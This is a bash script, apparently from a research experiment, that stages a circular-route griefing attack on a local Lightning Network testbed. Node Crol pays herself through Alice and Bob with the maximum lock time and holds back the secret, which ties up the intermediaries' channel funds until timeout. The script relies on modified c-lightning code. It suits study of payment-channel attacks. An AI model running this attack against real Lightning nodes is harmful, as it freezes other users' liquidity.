#!/bin/bash

# actors: Alice, Bob, Crol
# channels: Crol->Alice->Bob->Crol
# Use case: Crol pays herself (a circle route through Alice and Bob) - but do not return secret - attack. 
# Crol does not return her secrets - she sends update fail once her htlc reaches timeout. 
# This script shows the attack using circule route with maximum cltv expiry (using locktime max).
# Change in c-lightning code: Crol does not return secret (invoice.c), before timeout Crol sends update_fail_htlc (peer_htlcs.c)..

HOME='/home/ayelet'
. $HOME/.lightning/scripts/logger.sh

log_file="$HOME/.lightning/logs/exp6_circular_route_attack_locktime_max_$(date +'%d-%m-%Y-%H:%M:%S').log"

Alice_port=27592
Bob_port=27593
Crol_port=27594
amount_to_insert_lwallet=6
amount_to_insert_channel=16777215
payment_amount=100000000
#configurable per node, default is 2016=14*24*6
locktime_max=$((14 * 24 * 6))

. $HOME/.lightning/scripts/functions.sh -G $log_file

$HOME/.lightning/scripts/start_nodes.sh -G $log_file

create_channel Alice Bob $Bob_port $amount_to_insert_lwallet $amount_to_insert_channel

create_channel Bob Crol $Crol_port $amount_to_insert_lwallet $amount_to_insert_channel

create_channel Crol Alice $Alice_port $amount_to_insert_lwallet $amount_to_insert_channel

withdraw_remaining_amount Alice

withdraw_remaining_amount Bob

withdraw_remaining_amount Crol

print_channel_balances Alice Bob
print_channel_balances Bob Crol
print_channel_balances Crol Alice

alice_id=''
get_node_id Alice alice_id
bob_id=''
get_node_id Bob bob_id
crol_id=''
get_node_id Crol crol_id
sleep 2s

edebug "number of blocks: $(bitcoin-cli -datadir=$HOME/.bitcoin/Network getblockcount)" |& tee -a $log_file

#### Phase 2: Crol pays herself #####

einfo "\n####### Phase 2: Crol transfers money to herself through the lightning channel in a circular route #######" |& tee -a $log_file

inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc invoice $payment_amount "a-$(date +'%T:%N')" "$(date +'%T:%N') tx of $payment_amount msat a")

einfo "$inv" |& tee -a $log_file

payment_hash=$(jq '.payment_hash' <<< "$inv")

route="[
   {
    \"id\" : \"$alice_id\",
    \"channel\" : \"119x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+20000)),
    \"amount_msat\" : \"$((payment_amount+20000))msat\",
    \"delay\" : $locktime_max
 },
 {
    \"id\" : \"$bob_id\",
    \"channel\" : \"105x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+10000)),
    \"amount_msat\" : \"$((payment_amount+10000))msat\",
    \"delay\" : $(( locktime_max - 6))
 },
{
    \"id\" : \"$crol_id\",
    \"channel\" : \"112x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $payment_amount,
    \"amount_msat\" : \"${payment_amount}msat\",
    \"delay\" : $(( locktime_max - 6 - 9))
 }
]"

echo "route=$route" |& tee -a $log_file

$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc sendpay "$route" $payment_hash &

sleep 5s

bitcoin-cli -datadir=$HOME/.bitcoin/Network generatetoaddress $((locktime_max-17)) $(bitcoin-cli -datadir=$HOME/.bitcoin/Network  getnewaddress) 

sleep 5m


$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc waitsendpay $payment_hash

print_channel_balances Alice Bob
print_channel_balances Bob Crol
print_channel_balances Crol Alice


# if we put higher delay we can watch tail -f -n +1 ../Alice/lightningd_Alice.log | grep "too far from current"

